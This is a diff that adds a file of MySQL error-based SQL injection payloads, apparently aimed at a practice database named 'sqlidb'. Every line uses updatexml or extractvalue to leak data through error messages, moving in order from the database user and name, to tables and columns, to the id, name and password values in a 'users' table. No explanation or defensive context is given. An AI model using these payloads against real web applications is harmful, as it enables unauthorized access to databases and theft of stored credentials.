@@ -1,0 +1,14 @@
+-1") or updatexml(1,concat(0x7e,(select user()),0x7e),0)#
+-1") or updatexml(1,concat(0x7e,(select database()),0x7e),0)#
+-1") or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='sqlidb'),0x7e),0)#
+-1") or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='sqlidb'),0x7e),0)#
+-1") or updatexml(1,concat(0x7e,(select group_concat(id) from users),0x7e),0)#
+-1") or updatexml(1,concat(0x7e,(select group_concat(name) from users),0x7e),0)#
+-1") or updatexml(1,concat(0x7e,(select group_concat(pass) from users),0x7e),0)#
+-1") or extractvalue(1,concat(0x7e,(select user()),0x7e))#
+-1") or extractvalue(1,concat(0x7e,(select database()),0x7e))#
+-1") or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='sqlidb'),0x7e))#
+-1") or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='sqlidb'),0x7e))#
+-1") or extractvalue(1,concat(0x7e,(select group_concat(id) from users),0x7e))#
+-1") or extractvalue(1,concat(0x7e,(select group_concat(name) from users),0x7e))#
+-1") or extractvalue(1,concat(0x7e,(select group_concat(pass) from users),0x7e))#
